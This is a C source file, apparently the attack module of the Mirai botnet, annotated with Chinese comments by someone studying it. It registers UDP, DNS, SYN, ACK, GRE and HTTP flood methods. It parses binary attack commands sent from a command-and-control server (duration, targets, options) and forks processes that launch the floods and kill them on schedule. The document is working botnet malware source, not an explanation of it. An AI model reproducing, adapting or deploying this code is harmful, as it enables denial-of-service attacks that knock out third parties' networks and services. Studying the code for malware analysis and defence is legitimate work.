#define _GNU_SOURCE

#ifdef DEBUG
#include <stdio.h>
#endif
#include <stdlib.h>
#include <unistd.h>
#include <signal.h>
#include <errno.h>

#include "includes.h"
#include "attack.h"
#include "rand.h"
#include "util.h"
#include "scanner.h"


uint8_t methods_len = 0;
struct attack_method **methods = NULL;
int attack_ongoing[ATTACK_CONCURRENT_MAX] = {0};


//主线程添加系统支持的各个攻击方式
BOOL attack_init(void)
{
    int i;

    add_attack(ATK_VEC_UDP, (ATTACK_FUNC)attack_udp_generic);  //vector参数是攻击函数对应的编号  
    add_attack(ATK_VEC_VSE, (ATTACK_FUNC)attack_udp_vse);
    add_attack(ATK_VEC_DNS, (ATTACK_FUNC)attack_udp_dns);
	add_attack(ATK_VEC_UDP_PLAIN, (ATTACK_FUNC)attack_udp_plain);

    add_attack(ATK_VEC_SYN, (ATTACK_FUNC)attack_tcp_syn);//不加(ATTCK_FUNC)也可以吧
    add_attack(ATK_VEC_ACK, (ATTACK_FUNC)attack_tcp_ack);
    add_attack(ATK_VEC_STOMP, (ATTACK_FUNC)attack_tcp_stomp);

    add_attack(ATK_VEC_GREIP, (ATTACK_FUNC)attack_gre_ip);
    add_attack(ATK_VEC_GREETH, (ATTACK_FUNC)attack_gre_eth);

    //add_attack(ATK_VEC_PROXY, (ATTACK_FUNC)attack_app_proxy);
    add_attack(ATK_VEC_HTTP, (ATTACK_FUNC)attack_app_http);

    return TRUE;
}

//kill掉所有正在进行的攻击
void attack_kill_all(void)
{
    int i;

#ifdef DEBUG
    printf("[attack] Killing all ongoing attacks\n");
#endif

    for (i = 0; i < ATTACK_CONCURRENT_MAX; i++)
    {
        if (attack_ongoing[i] != 0)
            kill(attack_ongoing[i], 9);  //？？
        attack_ongoing[i] = 0;
    }

#ifdef MIRAI_TELNET
    scanner_init();
#endif
}

//解析从CNC下发的命令
void attack_parse(char *buf, int len)
{
    int i;
    uint32_t duration;
    ATTACK_VECTOR vector;
    uint8_t targs_len, opts_len;
    struct attack_target *targs = NULL;
    struct attack_option *opts = NULL;

    // Read in attack duration uint32_t   解析出4字节的持续时间
    if (len < sizeof (uint32_t))
        goto cleanup;
    duration = ntohl(*((uint32_t *)buf));
    buf += sizeof (uint32_t);
    len -= sizeof (uint32_t);

    // Read in attack ID uint8_t  解析出1字节的攻击ID
    if (len == 0)
        goto cleanup;
    vector = (ATTACK_VECTOR)*buf++;
    len -= sizeof (uint8_t);

    // Read in target count uint8_t   解析出1字节的攻击目标个数
    if (len == 0)
        goto cleanup;
    targs_len = (uint8_t)*buf++;
    len -= sizeof (uint8_t);
    if (targs_len == 0)
        goto cleanup;

    // Read in all targs  解析出所有的攻击目标，存入targs中，每个目标的信息存在attack_target中
    if (len < ((sizeof (ipv4_t) + sizeof (uint8_t)) * targs_len))
        goto cleanup;
    targs = calloc(targs_len, sizeof (struct attack_target));
    for (i = 0; i < targs_len; i++)
    {
        targs[i].addr = *((ipv4_t *)buf); //IP 
        buf += sizeof (ipv4_t);
        targs[i].netmask = (uint8_t)*buf++; //掩码
        len -= (sizeof (ipv4_t) + sizeof (uint8_t));

        targs[i].sock_addr.sin_family = AF_INET;
        targs[i].sock_addr.sin_addr.s_addr = targs[i].addr;//为何需要再转一次
    }

    // Read in flag count uint8_t   解析出选项的个数
    if (len < sizeof (uint8_t))
        goto cleanup;
    opts_len = (uint8_t)*buf++;
    len -= sizeof (uint8_t);

    // Read in all opts  解析出所有选项，存在opts中，每个选项存在attack_option中
    if (opts_len > 0)
    {
        opts = calloc(opts_len, sizeof (struct attack_option));
        for (i = 0; i < opts_len; i++)
        {
            uint8_t val_len;

            // Read in key uint8  解析出key
            if (len < sizeof (uint8_t))
                goto cleanup;
            opts[i].key = (uint8_t)*buf++;
            len -= sizeof (uint8_t);

            // Read in data length uint8  解析出data 长度
            if (len < sizeof (uint8_t))
                goto cleanup;
            val_len = (uint8_t)*buf++;
            len -= sizeof (uint8_t);

            if (len < val_len)
                goto cleanup;
            opts[i].val = calloc(val_len + 1, sizeof (char));
            util_memcpy(opts[i].val, buf, val_len);  //取出data
            buf += val_len;
            len -= val_len;
        }
    }

    errno = 0;
    attack_start(duration, vector, targs_len, targs, opts_len, opts);//参数就是上面解析出的各个字段。  最后4个参数传入攻击

    // Cleanup
    cleanup:
    if (targs != NULL)
        free(targs);
    if (opts != NULL)
        free_opts(opts, opts_len);
}

/*开始攻击*/
void attack_start(int duration, ATTACK_VECTOR vector, uint8_t targs_len, struct attack_target *targs, uint8_t opts_len, struct attack_option *opts)
{
    int pid1, pid2;

    pid1 = fork();
    if (pid1 == -1 || pid1 > 0)//父进程退出
        return;

    pid2 = fork();    //为啥要fork两次
    if (pid2 == -1)
        exit(0);
    else if (pid2 == 0)//子进程
    {
        sleep(duration);
        kill(getppid(), 9);
        exit(0);
    }
    else
    {
        int i;

        for (i = 0; i < methods_len; i++)
        {
            if (methods[i]->vector == vector)  //找到vector对应的攻击函数
            {
#ifdef DEBUG
                printf("[attack] Starting attack...\n");
#endif
                methods[i]->func(targs_len, targs, opts_len, opts);//这4个参数来自解析出的攻击命令
                break;
            }
        }

        //just bail if the function returns
        exit(0);
    }
}

//根据key 取得val
char *attack_get_opt_str(uint8_t opts_len, struct attack_option *opts, uint8_t opt, char *def)
{
    int i;

    for (i = 0; i < opts_len; i++)
    {
        if (opts[i].key == opt)
            return opts[i].val;
    }

    return def;
}


//得到某个攻击选项的值，默认为def
//opt为攻击选项
//opts为攻击选项键值对
//opts_len为攻击选项的个数
int attack_get_opt_int(uint8_t opts_len, struct attack_option *opts, uint8_t opt, int def)
{
    char *val = attack_get_opt_str(opts_len, opts, opt, NULL);

    if (val == NULL)
        return def;
    else
        return util_atoi(val, 10);
}

uint32_t attack_get_opt_ip(uint8_t opts_len, struct attack_option *opts, uint8_t opt, uint32_t def)
{
    char *val = attack_get_opt_str(opts_len, opts, opt, NULL);

    if (val == NULL)
        return def;
    else
        return inet_addr(val);
}

//新增一个攻击方式
static void add_attack(ATTACK_VECTOR vector, ATTACK_FUNC func)
{
    struct attack_method *method = calloc(1, sizeof (struct attack_method));

    method->vector = vector;
    method->func = func;

    methods = realloc(methods, (methods_len + 1) * sizeof (struct attack_method *));//methods 中存了所有攻击方式
    methods[methods_len++] = method;//新增一个攻击方式
}

static void free_opts(struct attack_option *opts, int len)
{
    int i;

    if (opts == NULL)
        return;

    for (i = 0; i < len; i++)
    {
        if (opts[i].val != NULL)
            free(opts[i].val);
    }
    free(opts);
}
